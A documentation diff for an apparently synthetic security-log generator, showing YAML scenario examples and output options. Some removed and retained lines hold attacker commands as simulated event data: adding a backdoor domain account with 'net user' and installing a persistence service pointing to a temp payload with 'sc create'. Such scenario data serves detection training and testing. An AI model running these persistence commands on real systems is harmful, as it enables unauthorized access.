-      source_ip: "185.220.101.34"
-    - type: failed_logon
-      source_ip: "185.220.101.34"
-    - type: logon
-      source_ip: "185.220.101.34"
-      logon_type: 3
-```
-
-**Process with explicit correlated events:**
 ```yaml
 - time: "+1h"
-  actor: attacker
+  actor: marcus.chen
   system: DC-01
-  activity: "Create backdoor domain account"
+  activity: "Create a domain service account"
   events:
     - type: process
       process_name: "C:\\Windows\\System32\\net.exe"
       command_line: "net user svc-audit P@ss! /add /domain"
-    - type: account_created
-      target_username: "svc-audit"
-```
-
-**Service persistence with correlated audit event:**
-```yaml
-- time: "+1h15m"
-  actor: attacker
-  system: WEB-01
-  activity: "Install malicious service for persistence"
-  events:
-    - type: process
-      process_name: "C:\\Windows\\System32\\sc.exe"
-      command_line: "sc create evilsvc binPath= C:\\Windows\\Temp\\payload.exe start= auto"
-    - type: service_installed
-      service_name: "evilsvc"
-      service_file_name: "C:\\Windows\\Temp\\payload.exe"
-```
-
-**Explicit cross-system events:**
-```yaml
-- time: "+1h30m"
-  actor: attacker
-  system: WEB-01
-  activity: "SSH lateral movement to web server"
-  events:
-    - type: ssh_session
-      source_ip: "10.20.10.13"
+      supplementary: auto
 ```
 
 ## Output
@@ -1363,11 +1844,15 @@ output:
   compression: false           # Optional (default: false)
 ```
 
+`destination` is retained as authored metadata and in resolved provenance. Current CLI generation
+writes the bundle beside the scenario by default; pass `eforge generate --output <bundle-root>` to
+choose another location explicitly.
+
 Supported formats: `windows`, `zeek`, `ecar` (simulated EDR using the eCAR record format), `eslogger` (macOS Endpoint Security NDJSON), `syslog`, `bash_history`, `snort_alert`, `cisco_asa`, `web_access`, `proxy_access`.
 
 Output formats here are canonical and target-neutral. Choose target-specific
 file shapes, such as SOF-ELK® Snare Windows events or year-partitioned RFC3164
-syslog, with `eforge generate --target default|sof-elk`; do not encode a parser
+syslog, with `eforge generate --target default|sof-elk|splunk`; do not encode a parser
 target in scenario YAML.
 
 `proxy_access` requires at least one system with `roles: [forward_proxy]`. If it is requested without a forward proxy system, validation warns because no proxy access log file will be generated. When proxy logs are requested, add `environment.proxy.mode` to make transparent vs explicit proxy semantics clear. Current proxy behavior assumes TLS interception, so HTTPS can include CONNECT plus inspected request rows; non-intercepting tunnel-only proxy behavior is deferred.
